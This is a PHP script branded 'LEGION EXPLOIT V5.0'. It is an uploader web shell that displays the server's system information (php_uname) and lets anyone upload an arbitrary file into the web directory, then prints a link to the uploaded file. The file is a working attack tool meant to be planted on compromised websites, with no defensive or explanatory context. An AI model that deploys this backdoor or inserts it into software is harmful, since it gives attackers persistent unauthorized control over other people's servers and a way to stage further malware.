<?php echo '<center><h1><font size="7" color="#ff3300">LEGION EXPLOIT V5.0</h1></font>'.'<br><b><font size="4" color="#00ff00">'.'[uname] '.php_uname().' [/uname] '.'</b></font><br><br><br>';
echo'<form method="post"enctype="multipart/form-data">';
echo'<input type="file"name="file"><input name="_upl"type="submit"value="Upload"></form>';
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$web = "http://".$_SERVER['HTTP_HOST'];
$dest = $web.'/'.$files;
if( $_POST['_upl']=="Upload"){
	
	if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){
		echo "LEGION Exploit Success! ->   <a href='$files' target='_blank'><b><u>$web/$files</u></b></a>";}
		else{
			echo'<b>LEGION Exploit Success!</b>';}}
		
?>